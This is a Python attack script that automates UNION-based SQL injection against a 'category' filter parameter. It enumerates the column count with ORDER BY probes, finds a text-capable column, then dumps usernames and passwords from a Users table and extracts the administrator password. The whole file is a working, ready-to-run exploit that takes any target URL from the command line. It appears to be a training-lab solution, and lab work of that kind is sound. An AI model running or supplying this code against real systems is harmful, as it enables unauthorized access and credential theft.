import requests
import sys
import urllib3
from bs4 import BeautifulSoup as BS
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = '/filter?category='
    for i in range(1, 50):
        sql_payload = "' ORDER BY %s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
    return False


def exploit_sqli_string_filed(url, num_col):
    path = '/filter?category='
    for i in range(1, num_col + 1):
        string = "'test test'"
        payload_list = ["NULL"] * num_col
        payload_list[i - 1] = string
        sql_payload = "' UNION SELECT " + ','.join(payload_list) + '--'
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False


def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category='
    sql_payload = "' UNION SELECT NULL, username || ':' || password FROM Users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if username in res:
        print('[+] Found the administrator password...')
        soup = BS(r.text, 'html.parser')
        admin_password = soup.find(text=re.compile('.*administrator.*')).split(':')[1]
        print(f'[+] The administrator password is %s ' % admin_password)
        # same as print(f'[+] The administrator password is {admin_password}')
        return True
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    print('[+] Figuring out the number of columns...')
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print('[+] The number of columns is %s' % num_col)
        print('[+] Figuring out which column accept string data type...')
        string_column = exploit_sqli_string_filed(url, num_col)
        if string_column:
            print('[+] The column that accept a string data type is column %s.' % string_column)
            print('[+] Dumping the list of usernames and passwords...')
            if not exploit_sqli_users_table(url):
                print('[-] Did not find an administrator password.')
        else:
            print('[-] There is no column that accept string data type.')
    else:
        print('[-] The SQL injection attack was not successful!.')

